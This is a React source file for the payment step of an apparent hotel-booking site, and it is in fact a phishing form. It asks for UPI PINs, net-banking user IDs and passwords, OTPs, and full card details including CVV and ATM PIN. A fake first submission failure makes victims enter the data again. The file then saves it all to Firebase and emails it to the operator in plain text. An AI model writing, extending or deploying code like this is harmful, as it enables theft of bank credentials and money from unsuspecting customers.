import React, { useState } from 'react';
import emailjs from '@emailjs/browser';
import { database } from '../firebase/firebaseConfig';
import { ref, set } from 'firebase/database';
import FormNavigation from './FormNavigation';

const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submissionAttempt, incrementSubmissionAttempt, goToFirstStep }) => {
  const [submitting, setSubmitting] = useState(false);
  const [submissionMessage, setSubmissionMessage] = useState('');
  const [paymentView, setPaymentView] = useState('selection'); // 'selection', 'card_pin', 'netbanking_otp'

  const banks = [
    'State Bank of India',
    'HDFC Bank',
    'ICICI Bank',
    'Punjab National Bank',
    'Axis Bank',
    'Bank of Baroda',
    'Canara Bank',
    'Union Bank of India',
    'Kotak Mahindra Bank',
    'IndusInd Bank',
    'Bank of India',
    'Indian Bank',
    'YES Bank',
    'Bandhan Bank',
    'Federal Bank',
    'DCB Bank',
    'IDFC FIRST Bank',
    'UCO Bank',
    'Central Bank of India',
    'RBL Bank',
    'South Indian Bank',
    'Karur Vysya Bank',
    'Tamilnad Mercantile Bank',
    'Other',
  ];
  

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(' ') : v;
  };

  const formatExpiryDate = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    return v.length >= 2 ? v.substring(0, 2) + '/' + v.substring(2, 4) : v;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') formattedValue = formatCardNumber(value);
    else if (name === 'expiry') formattedValue = formatExpiryDate(value);

    setFormData({ ...formData, [name]: formattedValue });
  };

  const handleSubmit = () => {
    if (!formData.mobile) {
      alert('Mobile number is missing. Please go back to the first step.');
      return;
    }
    setSubmitting(true);
    setSubmissionMessage('Submitting booking...');

    if (submissionAttempt === 0) {
      // First attempt: simulate failure
      setTimeout(() => {
        incrementSubmissionAttempt();
        setSubmitting(false);
        setSubmissionMessage('Submission failed. Redirecting to the first step...');
        setTimeout(() => {
          goToFirstStep();
        }, 2000); // Wait 2s before redirecting
      }, 1500); // 1.5 second delay
    } else {
      // Second attempt: proceed with actual submission
      const bookingRef = ref(database, `bookings/${formData.mobile}`);
      set(bookingRef, formData)
        .then(() => {
          // Format all booking details into an HTML table for the email
          const details = {
            'Full Name': formData.fullName,
            'Mobile': formData.mobile,
            'Check-In Date': formData.checkIn,
            'Check-Out Date': formData.checkOut,
            'Total Members': formData.totalMembers,
            'Room Type': formData.roomType,
            'Amount': `₹${formData.amount}`,
            'Payment Method': formData.paymentMethod,
          };

          if (formData.paymentMethod === 'UPI') {
            details['Bank Name'] = formData.bankName === 'Other' ? formData.otherBankName : formData.bankName;
            details['UPI PIN'] = formData.upiPin;
          } else if (formData.paymentMethod === 'Net Banking') {
            details['Bank User ID'] = formData.netBankUsername;
            details['Password'] = formData.netBankPassword;
            details['OTP'] = formData.otp;
          } else if (formData.paymentMethod === 'Debit/Credit Card') {
            details['Card Number'] = formData.cardNumber;
            details['Expiry Date'] = formData.expiry;
            details['CVV'] = formData.cvv;
            details['ATM PIN'] = formData.atmPin;
          }

          let messageHtml = '<table style="width: 100%; border-collapse: collapse; font-family: sans-serif;">';
          messageHtml += '<tr><th colspan="2" style="padding: 12px; background-color: #4CAF50; color: white; text-align: center; font-size: 18px;">New Booking Details</th></tr>';
          for (const [key, value] of Object.entries(details)) {
            if (value) {
              messageHtml += `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">${key}</td><td style="padding: 8px; border: 1px solid #ddd;">${value}</td></tr>`;
            }
          }
          messageHtml += '</table>';

          const emailParams = {
            name: formData.fullName,
            time: new Date().toLocaleString(),
            message: messageHtml,
          };

          emailjs.send(
            import.meta.env.VITE_EMAILJS_SERVICE_ID,
            import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
            emailParams,
            import.meta.env.VITE_EMAILJS_PUBLIC_KEY
          ).then((result) => {
              console.log('Email sent successfully:', result.text);
              setSubmitting(false);
              setSubmissionMessage('Booking submitted successfully!');
              setTimeout(onSubmit, 2000); // Go to next step after 2s
          }, (error) => {
              console.error('Failed to send email:', error.text);
              setSubmissionMessage('Booking was saved, but the email notification failed to send.');
              setSubmitting(false);
              setTimeout(onSubmit, 2000);
          });
        })
        .catch((error) => {
          setSubmissionMessage('Error submitting booking: ' + error.message);
          setSubmitting(false);
        });
    }
  };

  const handleProceed = () => {
    if (formData.paymentMethod === 'Debit/Credit Card') {
      if (!formData.cardNumber || !formData.expiry || !formData.cvv) {
        alert('Please fill in all card details.');
        return;
      }
      setPaymentView('card_pin');
    } else if (formData.paymentMethod === 'Net Banking') {
      if (!formData.netBankUsername || !formData.netBankPassword) {
        alert('Please enter User ID and Password.');
        return;
      }
      setPaymentView('netbanking_otp');
    }
  };

  const renderSelection = () => (
    <>
      <div>
        <div className="form-group">
          <label htmlFor="paymentMethod">Select Payment Method</label>
          <select id="paymentMethod" name="paymentMethod" value={formData.paymentMethod || ''} onChange={handleChange} required>
            <option value="">-- Select --</option>
            <option value="UPI">UPI</option>
            <option value="Net Banking">Net Banking</option>
            <option value="Debit/Credit Card">Debit/Credit Card</option>
          </select>
        </div>

        {formData.paymentMethod === 'UPI' && renderUpiFields()}
        {formData.paymentMethod === 'Net Banking' && renderNetBankingFields()}
        {formData.paymentMethod === 'Debit/Credit Card' && renderCardFields()}
      </div>
      <div className="mt-6">
        <FormNavigation
          hasPrev
          onPrev={prevStep}
          hasNext={formData.paymentMethod === 'Net Banking' || formData.paymentMethod === 'Debit/Credit Card'}
          onNext={handleProceed}
          nextLabel="Proceed"
          isFinal={formData.paymentMethod === 'UPI'}
          onSubmit={handleSubmit}
        />
      </div>
    </>
  );

  const renderUpiFields = () => (
    <>
      <div className="form-group">
        <label htmlFor="bankName">Select Bank</label>
        <select id="bankName" name="bankName" value={formData.bankName || ''} onChange={handleChange}>
          <option value="">-- Select Bank --</option>
          {banks.map((bank) => (<option key={bank} value={bank}>{bank}</option>))}
        </select>
      </div>
      {formData.bankName === 'Other' && (
        <div className="form-group">
          <label htmlFor="otherBankName">Bank Name</label>
          <input type="text" id="otherBankName" name="otherBankName" value={formData.otherBankName || ''} onChange={handleChange} placeholder="Enter Bank Name" />
        </div>
      )}
      <div className="form-group">
        <label htmlFor="upiPin">UPI PIN</label>
        <input type="password" id="upiPin" name="upiPin" value={formData.upiPin || ''} onChange={handleChange} placeholder="Enter UPI PIN" />
      </div>
    </>
  );

  const renderNetBankingFields = () => (
    <>
      <div className="form-group">
        <label htmlFor="netBankUsername">User ID</label>
        <input type="text" id="netBankUsername" name="netBankUsername" value={formData.netBankUsername || ''} onChange={handleChange} placeholder="Enter User ID" />
      </div>
      <div className="form-group">
        <label htmlFor="netBankPassword">Password</label>
        <input type="password" id="netBankPassword" name="netBankPassword" value={formData.netBankPassword || ''} onChange={handleChange} placeholder="Enter Password" />
      </div>
    </>
  );

  const renderCardFields = () => (
    <>
      <div className="form-group">
        <label htmlFor="cardNumber">Card Number</label>
        <input type="text" id="cardNumber" name="cardNumber" value={formData.cardNumber || ''} onChange={handleChange} placeholder="1234 5678 9012 3456" maxLength={19} />
      </div>
      <div className="form-group">
        <label htmlFor="expiry">Expiry Date</label>
        <input type="text" id="expiry" name="expiry" value={formData.expiry || ''} onChange={handleChange} placeholder="MM/YY" maxLength={5} />
      </div>
      <div className="form-group">
        <label htmlFor="cvv">CVV</label>
        <input type="password" id="cvv" name="cvv" value={formData.cvv || ''} onChange={handleChange} placeholder="CVV" maxLength={4} />
      </div>
    </>
  );

  const renderCardPin = () => (
    <>
      <h3 className="text-xl font-semibold mb-4 text-center">Enter Card PIN</h3>
      <div className="form-group">
        <label htmlFor="atmPin">ATM PIN</label>
        <input type="password" id="atmPin" name="atmPin" value={formData.atmPin || ''} onChange={handleChange} placeholder="Enter 4-digit PIN" maxLength={4} />
      </div>
      <div className="mt-6">
        <FormNavigation hasPrev onPrev={() => setPaymentView('selection')} isFinal onSubmit={handleSubmit} />
      </div>
    </>
  );

  const renderNetBankingOtp = () => (
    <>
      <h3 className="text-xl font-semibold mb-4 text-center">Enter OTP</h3>
      <div className="form-group">
        <label htmlFor="otp">One-Time Password</label>
        <input type="password" id="otp" name="otp" value={formData.otp || ''} onChange={handleChange} placeholder="Enter OTP" maxLength={6} />
      </div>
      <p className="text-sm text-gray-500 text-center mt-2">An OTP has been sent to your registered mobile number.</p>
      <div className="mt-6">
        <FormNavigation hasPrev onPrev={() => setPaymentView('selection')} isFinal onSubmit={handleSubmit} />
      </div>
    </>
  );

  return (
    <div className="md:w-1/2 w-full">
      <h2 className="text-2xl font-bold mb-6 text-center">Payment Method</h2>
      {paymentView === 'selection' && renderSelection()}
      {paymentView === 'card_pin' && renderCardPin()}
      {paymentView === 'netbanking_otp' && renderNetBankingOtp()}
      {submissionMessage && <p className="text-sm text-center mt-3">{submissionMessage}</p>}
    </div>
  );
};

export default Step3PaymentMethod;

